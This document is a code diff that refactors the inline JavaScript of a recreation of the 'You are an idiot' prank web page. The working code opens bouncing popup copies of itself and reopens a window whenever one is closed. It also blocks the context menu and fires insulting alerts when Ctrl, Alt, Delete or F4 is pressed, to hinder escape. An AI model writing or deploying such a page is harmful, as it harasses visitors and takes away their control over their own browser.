@@ -53,9 +53,9 @@
     <script>
         let dx;
         let dy;
-        let xPos;
-        let yPos;
-        let valid = false;
+        let xPos = screenX;
+        let yPos = screenY;
+        valid_state = false;
         const size_str = 'width=360,height=350';
 
         const reflect = (n, m) => m - ((n % m) + m) % m;
@@ -82,38 +82,45 @@
             setTimeout(bounce, 1, 0);
         }
 
+        const init = () => {
+            valid_state = true;
+            document.querySelector('html').style.display = 'block';
+            document.querySelector('body').style.display = 'block';
+            document.querySelector('svg').style.display = 'block';
+            document.title = 'You are an idiot!';
+        }
+
         onbeforeunload = function () {
-            if (!valid) return;
-            open(location.href, '', `${size_str},top=${yPos},left=${xPos}`);
-            return 'Are you an idiot?';
+            if (valid_state) {
+                open(location.href, '', `${size_str},top=${yPos},left=${xPos}`);
+                return 'Are you an idiot?';
+            }
         };
 
         oncontextmenu = () => false;
 
         onkeydown = function () {
-            if (!valid) return;
-            const keyCode = event.keyCode;
-            if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) alert('You are an idiot!');
+            if (valid_state) {
+                const keyCode = event.keyCode;
+                if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) alert('You are an idiot!');
+            }
         }
 
-        const popup = open();
-        if (popup === null || typeof popup === 'undefined') alert('Please reload with popups unblocked');
-        else {
-            popup.close();
-            document.querySelector('html').style.display = 'block';
-            document.querySelector('body').style.display = 'block';
-            document.querySelector('svg').style.display = 'block';
-            document.title = 'You are an idiot!';
-            valid = true;
-            if (opener) {
-                xPos = screenX;
-                yPos = screenY;
-                dx = 5 * Math.random() + 5;
-                if (Math.random() < 0.5) dx *= -1;
-                dy = 5 * Math.random() + 5;
-                if (Math.random() < 0.5) dy *= -1;
-                bounce(3);
-            } else open(location.href, '', size_str);
+        if (opener?.valid_state) {
+            init();
+            dx = 5 * Math.random() + 5;
+            if (Math.random() < 0.5) dx *= -1;
+            dy = 5 * Math.random() + 5;
+            if (Math.random() < 0.5) dy *= -1;
+            bounce(3);
+        } else {
+            const popup = open();
+            if (!popup) alert('Please reload with popups unblocked');
+            else {
+                popup.close();
+                init();
+                open(location.href, '', size_str);
+            }
         }
     </script>
 </body>
